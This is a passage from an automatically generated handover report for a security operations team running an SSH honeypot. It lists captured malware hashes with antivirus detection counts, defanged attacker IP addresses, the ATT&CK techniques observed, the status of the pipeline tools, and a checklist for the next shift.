| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `6b3a55e0261b0304143f805a24924d0c1c44524821305f31d9277843b8a10f4e` | Unknown binary | `6b3a55e0261b0304...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 13/100 | 🟢 LOW | **33/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `107.182.234[.]69` | US | Hosting Services, Inc. | **100** ⚠️ | 1 |
| `43.159.136[.]59` | US | Asia Pacific Network Information Center, Pty. Ltd. | **100** ⚠️ | 0 |
| `137.184.204[.]8` | US | DigitalOcean, LLC | **100** ⚠️ | 1 |
| `124.66.99[.]26` | CN | China Unicom Hainan province network | **100** ⚠️ | 5 |
| `120.196.66[.]80` | CN | China Mobile Communications Corporation | **100** ⚠️ | 24 |
| `49.51.197[.]125` | US | Tencent cloud computing (Beijing) Co., Ltd. | **100** ⚠️ | 2 |
| `118.31.61[.]125` | CN | Aliyun Computing Co., LTD | **100** ⚠️ | 2 |
| `182.218.116[.]96` | KR | LG POWERCOMM | **100** ⚠️ | 30 |
| `54.146.183[.]54` | US | Amazon Data Services Northern Virginia | **100** ⚠️ | 36 |
| `16.58.56[.]214` | US | Amazon.com, Inc. | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 56 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 28 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 23 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 14 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 14 |

---

## 🔕 False Positive Summary (10 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 1 |
| AbuseIPDB score 16 below threshold 25 | 1 |
| AbuseIPDB score 4 below threshold 25 | 2 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 6 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 607 cases |
| Tool 34  | Credential Extractor        | ✅ 51 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 4 fingerprints |
| Tool 36  | Command Clustering          | ✅ 1 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 22 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 10 filtered (1.7%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 18 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 28 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 28 priority case(s) shown individually · 15 recon entry/entries in table (9 group(s) consolidating 563 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-05-17T13:28:42Z_
